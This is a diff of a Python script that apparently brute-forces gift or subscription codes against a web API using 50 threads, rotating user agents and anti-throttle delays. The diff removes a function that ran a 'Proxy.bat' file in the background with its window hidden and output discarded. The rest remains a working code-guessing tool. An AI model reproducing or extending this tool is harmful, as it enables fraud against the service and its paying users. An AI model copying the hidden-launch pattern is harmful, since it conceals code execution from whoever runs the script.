@@ -1,9 +1,9 @@
+import os
 import requests
 import threading
 import random
 import string
 import time
-import subprocess
 from colorama import Fore, init
 
 init(autoreset=True)
@@ -22,7 +22,6 @@ LOGO = f"""
 VALID_CODES_FILE = "valid_codes.txt"
 THREAD_COUNT = 50
 REQUEST_DELAY = 1
-PROXY_LIST = []
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
@@ -32,32 +31,9 @@ USER_AGENTS = [
 file_lock = threading.Lock()
 print_lock = threading.Lock()
 
-def run_proxy_setup():
-    """Runs Proxy.bat in the background without waiting for it to finish."""
-    try:
-        # Configure to hide the console window (Windows only)
-        startupinfo = subprocess.STARTUPINFO()
-        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-        
-        # Start the process without waiting
-        subprocess.Popen(
-            ["Proxy.bat"],
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-            startupinfo=startupinfo,
-            creationflags=subprocess.CREATE_NO_WINDOW
-        )
-        print(Fore.GREEN + "[+] Proxy.bat started in the background.")
-        return True
-    except Exception as e:
-        print(Fore.RED + f"[-] Error running Proxy.bat: {str(e)}")
-        return False
-
 def get_session():
-    """Creates a session with a random User-Agent and proxy."""
+    """Creates a session with a random User-Agent."""
     session = requests.Session()
-    if PROXY_LIST:
-        session.proxies.update({"http": random.choice(PROXY_LIST)})
     session.headers.update({"User-Agent": random.choice(USER_AGENTS)})
     return session
 
@@ -80,7 +56,7 @@ def check_code(code):
                 params={"with_application": False, "with_subscription_plan": True},
                 timeout=15
             )
-            time.sleep(REQUEST_DELAY + random.uniform(0, 0.5))  # Anti-throttle
+            time.sleep(REQUEST_DELAY + random.uniform(0, 0.5))
             return response.status_code == 200
     except:
         return False
@@ -107,13 +83,6 @@ def main():
     # Display the logo
     print(LOGO)
     print(f"{Fore.YELLOW}[*] Starting the system...{Fore.RESET}\n")
-
-    # Run Proxy.bat in the background
-    print(Fore.YELLOW + "[*] Initializing proxy...")
-    if not run_proxy_setup():
-        print(Fore.RED + "[-] Continuing without proxy!")
-    else:
-        print(Fore.GREEN + "[+] Proxy setup initiated in the background.")
 
     # Start the main generation process
     print(f"\n{Fore.MAGENTA}[*] Starting {THREAD_COUNT} threads...{Fore.RESET}")
